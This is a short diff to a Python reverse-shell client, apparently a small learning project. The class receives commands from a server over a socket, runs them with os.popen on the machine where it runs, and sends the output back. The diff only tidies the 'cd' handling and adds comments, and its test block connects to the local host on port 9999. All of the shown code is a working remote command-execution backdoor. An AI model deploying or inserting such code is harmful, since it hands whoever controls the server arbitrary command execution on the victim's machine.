@@ -10,16 +10,19 @@ class ClientReverseShell(Client):
         #getting the command from the server
         comm = self.recv_data()
         #executing the command on the client machine(the machine on which this script will run)
+        #the special case  of wanting to change the directory
         if "cd" == comm.strip()[:2]:
-            dir = comm[comm.index('d')+1:]
+            dir = comm[comm.index('d')+1:].lstrip()
             os.chdir(dir)
-            self.send_data(f"directory has been changed to {os.popen('pwd').read()}")
+            cwd = os.popen('pwd').read()
+            self.send_data(f"directory has been changed to {cwd}")
+        #the normal case of just wanting to execute a command
         else:
             exec_comm = os.popen(comm)
             #sending the command response back to the server
             self.send_data(exec_comm.read())
 
-#testing the reverse shell client
+#quick testing of the reverse shell client
 if __name__ == "__main__":
     client = ClientReverseShell(socket.gethostname(),9999)
     while True:
